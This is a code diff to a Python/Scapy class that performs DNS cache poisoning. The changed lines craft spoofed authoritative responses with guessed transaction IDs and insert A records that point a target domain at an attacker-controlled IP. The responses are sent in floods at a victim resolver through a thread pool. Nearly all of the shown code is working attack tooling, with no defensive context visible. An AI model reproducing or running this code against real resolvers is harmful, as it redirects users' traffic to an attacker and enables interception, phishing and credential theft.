@@ -14,6 +14,7 @@ import logging
 import threading
 import multiprocessing
 import signal
+import sys
 
 ## DNSPoisoning
 #
@@ -40,7 +41,7 @@ class DNSPoisoning:
     #
     #
     def __init__(self, victim_server, spoofed_domain, attacker_ip, authoritative_ns,\
-         initial_id=None, ttl=30000, victim_mac=None, nic_interface=None, \
+         initial_id=None, sport=53, ttl=30000, victim_mac=None, nic_interface=None, socket=None,\
              interrupt_handler=None, blessing_terminal=None, log=lambda msg: None):
         
         ## Victim Server IP
@@ -57,9 +58,11 @@ class DNSPoisoning:
         self.nic_interface = nic_interface
         ## Authoritative nameserver
         self.auth_nameserver = authoritative_ns
-        
+        ## DNS Request source port
+        self.source_port = sport
+
         self.flood_pool = None
-        self.flood_socket = None
+        self.flood_socket = socket
 
 
         if initial_id is not None:
@@ -95,6 +98,12 @@ class DNSPoisoning:
     def set_victim_mac(self, victim_mac):
         self.victim_mac = victim_mac
 
+    def set_invalid_url(self, url):
+        self.invalid_url = url
+
+    def set_id(self, id):
+        self.id = id
+
     ##  Open Socket
     #   @brief Open a socket for flooding
     #
@@ -104,9 +113,10 @@ class DNSPoisoning:
     def open_socket(self):
         if self.flood_socket != None:
             self.flood_socket.close()
-        self.log("Opening socket...")
-        self.flood_socket = conf.L3socket(iface=self.nic_interface) 
 
+    
+    def create_socket(self, interface):
+        return conf.L3socket(iface=interface) 
     ## Faster Flooding Mode
     #   @brief Send Crafted Packet via Ethernet packets 
     #   @param  victim_mac  The victim DNS server MAC address. If none is specified the one setted in the contructor will be used.
@@ -130,23 +140,23 @@ class DNSPoisoning:
         pkts = []
 
         ## Number of queries and responses to send
-        number_of_response = 500
+        number_of_response = 2
         ## Spacing value to be added to the initial ID value
-        spacing = 600
+        spacing = random.randint(1,5)
 
 
-        print("Sending {t.bold}{t.blue}{n_query}{t.normal} queries".format(t=self.t, n_query=number_of_response))
-        print("Range from {t.bold}{t.blue}{int_id} to {fin_id}{t.normal}".format(int_id= self.id+spacing, fin_id= (self.id+1000+spacing) % 65535-1, t=self.t))
+        self.log("Sending {t.bold}{t.blue}" + str(number_of_response) + "{t.normal} queries")
+        #print("Range from {t.bold}{t.blue}{int_id} to {fin_id}{t.normal}".format(int_id= self.id+spacing, fin_id= (self.id+number_of_response+spacing) % 65535-1, t=self.t))
         
-        #query = Ether(dst=victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.invalid_url))
+        query = Ether(dst=victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.invalid_url))
+        pkts.append(query)
 
-        for ID in range (self.id +spacing,(self.id + number_of_response + spacing) % 65535-1):
+        guess_range = range (self.id +spacing,(self.id + number_of_response + spacing) % 65535-1)
 
-            query = Ether(dst=victim_mac)/IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.invalid_url))
-            pkts.append(query)
+        for ID in guess_range:
 
-            crafted_response = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
-                /UDP(dport=53, sport=53)\
+            old_crafted_response = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
+                /UDP(dport=31100, sport=53)\
                     /DNS(id=ID,\
                         qr=1,\
                         #rd=1,\
@@ -157,10 +167,22 @@ class DNSPoisoning:
                         ns=DNSRR(rrname=self.spoofed_domain, type='NS', rclass='IN', ttl=self.ttl, rdata='ns.' + self.spoofed_domain)\
                     )
 
+            crafted_response = Ether(dst=self.victim_mac)/IP(dst=self.victim_server, src=self.auth_nameserver)\
+                /UDP(dport=self.source_port, sport=53)\
+                    /DNS(id=ID,\
+                        qr=1,\
+                        rd=0,\
+                        ra=0,\
+                        aa=1,\
+                        qd=DNSQR(qname=self.invalid_url, qtype="A", qclass='IN'),\
+                        ar=DNSRR(rrname=self.spoofed_domain, type='A', rclass='IN', ttl=5600, rdata=self.attacker_ip)/\
+                            DNSRR(rrname=self.invalid_url, rdata=self.attacker_ip, type="A", rclass="IN", ttl=5600)\
+                    )            
+
             pkts.append(crafted_response)
 
 
-        print("Initial Query sended, start flooding")
+        self.log("Initial Query sended, start flooding")
 
 
         sendp(pkts, verbose=1, iface=nic_interface)
@@ -272,7 +294,8 @@ class DNSPoisoning:
 
         #Taken from that: https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html 
         self.log("Same socket for faster flood...")
-        self.open_socket()
+        if self.flood_pool is None:
+            self.open_socket()
         self.flood_pool = ThreadPool(number_of_guess)
 
         result = self.flood_pool.map(self.send_crafted_packet, id_range)
@@ -317,4 +340,5 @@ class DNSPoisoning:
         self.log("Cache poisoning stopped")
 
         if self.interrupt_handler  != None:     #If an interrupt handler is passed
-            signal.signal(signal.SIGINT, self.interrupt_handler)    #Set it as a new SIGINT handler
+            #signal.signal(signal.SIGINT, self.interrupt_handler)    #Set it as a new SIGINT handler
+            sys.exit(0)
